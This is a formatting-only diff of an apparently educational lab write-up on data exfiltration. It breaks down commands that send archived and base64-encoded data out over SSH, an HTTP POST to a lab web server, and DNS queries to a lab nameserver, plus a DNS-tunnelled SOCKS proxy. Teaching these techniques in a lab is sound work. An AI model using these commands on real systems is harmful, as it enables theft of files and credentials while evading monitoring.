@@ -84,11 +84,14 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
     Let's break down this command step by step:
 
     1. `tar zcf - task4/` This command creates a *compressed tarball* (archive) of the `task4` directory and sends the output to the standard output (indicated by `-`) using the `tar` utility. Here's what each option does:
+
         - `z` Compress the archive using gzip.
         - `c` Create a new archive.
         - `f` Specify the archive file.
         - `-` Send the output to stdout (standard output) instead of a file.
         - `task4/` The directory to be archived.
+
+<!-- -->
 
     2. `|` This is a *pipe operator*, which takes the output of the previous command and passes it as input to the next command.
  
@@ -124,6 +127,7 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
     Let's break down the commands again:
 
     1. `dd conv=ascii if=task4-creds.data | base64 -d > task4-creds.tar` does the opposite of what we did before, that is, decoding the data.
+
         - `dd conv=ascii if=task4-creds.data` This part of the command uses the `dd` utility to read data from the input file `task4-creds.data`. The `conv=ascii` option specifies that the data should be converted from *EBCDIC* encoding to *ASCII*. The `if=task4-creds.data` option specifies the input file as `task4-creds.data`.
 
         - `|` This is a pipe operator, which we explained before.
@@ -132,10 +136,14 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
         - `> task4-creds.tar` This portion of the command redirects the decoded data to an output file named `task4-creds.tar`. The data, which was originally encoded and then decoded, is saved in this file.
 
+<!-- -->
+
     2. `tar` We are using the `tar` utility again, but this time for extracting the directory.
+
         - `x` This option stands for "extract", and it is used to extract the contents of an archive.
         - `f` This option specifies that the next argument will be the name of the archive file from which we want to extract the contents. In this case, `task4-creds.tar` is the archive file.
 
+<!-- -->
 
     ![Decoding and unarchiving data](decode-unarchive-data.png)
 
@@ -160,8 +168,11 @@ The above command creates a tarball and sends it over SSH to the Jumpbox SSH ser
 2. `|` We have also seen what the *pipe operator* does.
 
 3. `ssh thm@jump.thm.com "cd /tmp/; tar xpf -"` This part of the command uses the `ssh` command to establish an SSH connection. Here's what's happening:
+
     - `ssh thm@jump.thm.com` Initiates an SSH connection to the remote server `jump.thm.com` with the username `thm`.
     - `"cd /tmp/; tar xpf -"` This part is executed on the remote server after the SSH connection is established. It changes the working directory to `/tmp`, and then extracts a tarball from standard input. The `p` options is used to preserve file permissions, ownership, and timestamps when extracting files. This ensures that the extracted files retain their original attributes.
+
+<!-- -->
 
 ![SSH transmission](ssh-transmission.png)
 
@@ -170,10 +181,13 @@ The above command creates a tarball and sends it over SSH to the Jumpbox SSH ser
 ### 5.1 HTTP POST Request
 
 Data Exfiltration through HTTP(S) is one of the best methods, as it hard to distinguish between legitimate and malicious HTTP traffic. We will be using the **POST HTTP request**, as with a **GET HTTP request**, all parameters are registered into the log file. POST HTTP requests:
+
 - Are never cached.
 - Do not remain in the browser history.
 - Cannot be bookmarked.
 - Have no restrictions on data length.
+
+<!-- -->
 
 Let's login into `web.thm.com` and inspect the Apache log file with 2 HTTP Requests:
 
@@ -230,6 +244,7 @@ The above PHP script will handle POST requests via the `file` parameter and stor
     1. `curl` This is the command-line utility used to transfer data to or from a server using various supported protocols. In this case, we are using it for an **HTTP POST request**.
     2. `--data "file=$(tar zcf - task6 | base64)"` This part of the command specifies the data to be included in the HTTP POST request. It's using the `--data` option to send data. The data is enclosed in double quotes.
     3. `file=$(tar zcf - task6 | base64)` This is the data being sent in the POST request. It's a combination of several commands which we have used before. In brief, it creates a compressed tarball of the `task6` directory and `base64` encodes it, making it suitable for transmission in a POST request.
+
         - `$(...)` This is **command substitution**. It allows the output of the enclosed command sequence, in this case, the Base64-encoded tarball, to be used as a string within the `--data` parameter.
     4. `http://web.thm.com/contact.php` This part of the command specifies the URL to which the HTTP POST request will be sent. It's making a POST request to the `contact.php` script on the `web.thm.com` web server.
 
@@ -257,11 +272,14 @@ The above PHP script will handle POST requests via the `file` parameter and stor
     2. `-i` This option indicates that it should edit the file in place.
 
     3. `'s/ /+/g'` This is the sed command to perform the text transformation. It's written in the form of a **substitution command**. Here's what each part does:
+
         - `s` This indicates that it's a substitution operation.
         - `/` This character separates the search pattern from the replacement pattern.
         - `/ /` This is the search pattern. It's looking for spaces.
         - `+` This is the replacement pattern. It replaces spaces with plus symbols.
         - `g` This is a flag that specifies that the substitution should be performed globally in the file (i.e., on all occurrences of the search pattern, not just the first one).
+
+<!-- -->
 
     4. `/tmp/http.bs64` This is the path to the file on which sed will operate.
 
@@ -463,9 +481,12 @@ The domain name consists of three parts. For instance, for `www.example.com`:
 ![Domain name structure](domain-name-structure.png){: width="70%"}
 
 **DNS records** are essential components of the DNS infrastructure that provide information about **how domain names should be resolved** to their corresponding IP addresses or other types of data. There are various DNS record types and each one serves a specific purpose. We will explain just the three that we will be using for this task:
+
 - `A` The **Address** record maps a domain name to an IPv4 address. 
 - `NS` The **Name Server** record specifies the authoritative name servers for a domain. These are responsible for providing DNS information about the domain.
 - `TXT` The **Text** record can store any text data and it can be used for various purposes.
+
+<!-- -->
 
 ### 7.1 DNS Configurations
 
@@ -596,8 +617,11 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     3. `tr -d "\n"` The `tr` command is used for translating or deleting characters. In this case, we use it to remove newline characters, `\n` from the output. Newline characters are typically used to separate lines of text, so with this, we essentially remove line breaks.
     4. `fold -w18` The `fold` command is used to wrap text to a specified width, in this case, it wraps the text into lines of 18 characters each. This helps format the data info fixed-width lines.
     5. `sed -r 's/.*/&.att.tunnel.com/'` We have seen the stream editor before as well. We now use it with [regular expressions](https://www.w3schools.com/js/js_regexp.asp), aka **regex**, to modify each line of the input text:
+
         - `-r` This tells `sed` to used extended regex.
         - `s/.*/&.att.tunnel.com/'` This is a regex substitution. It takes each line (`.*` matches the entire line), and appends `.att.tunnel.com` to it.  
+
+<!-- -->
 
     Another way of doing this, is by splitting every 18 characters with a dot `.` and add the nameserver after:
 
@@ -606,10 +630,13 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     ```
 
     This command is similar to the above with a few changes:
+
     - `cat task9/credit.txt | base64 | tr -d "\n" | fold -w18` This part is identical. So by now, we have encoded the data, removed line breaks, and grouped it in lines of 18 characters each.
     - `sed 's/.*/&./'` We append a period, `.`, to the end of each line.
     - `tr -d "\n"` After we grouped the data in fixed-width lines, and appended a dot at the end of each, we now remove once again the line breaks. This will result having a single line of data.
     - `sed s/$/att.tunnel.com/` This appends `att.tunnel.com` on the line. The regex `s/$` matches the end of the line, and it is replaced with `att.tunnel.com`.
+
+<!-- -->
 
     ![Encoding and formatting data](dns-splitting-content.png)
 
@@ -620,8 +647,11 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     ```
 
     We added two things at the end of the command:
+
     - `awk '{print "dig +short " $1}'` The `awk` command is used to process text data. In this case, it takes the single line of text and prints a `dig +short` command followed by the text from the line, effectively creating a `dig` command. 
     - `bash` This executes the `dig` command generated by `awk` through the Bash shell.
+
+<!-- -->
 
     We can see how the output has changed by adding the `awk` command:
 
@@ -757,7 +787,6 @@ For this task, we will be using `jump.thm.com` to log into `victim2.thm.com` (lo
     1. `curl` Command-line tool for performing HTTP requests.
     2. `--socks5 127.0.0.1:1080` Specifies the use of a SOCKS5 proxy for the HTTP request. **SOCKS (Socket Secure)** is a protocol used for routing network packets between a client and a server through a proxy server. In this case, we specify that the proxy server is running locally on the machine (`127.0.0.1`) and listening on port `1080`. This is often used for anonymizing or routing traffic through an intermediary server.
     3. `http://192.168.0.100/demo.php` The URL of the resource that we want to retrieve.
-
 
 We can confirm that all traffic goes through DNS by checking the `tcpdump` on the Attacker machine through the `eth0` interface:
 
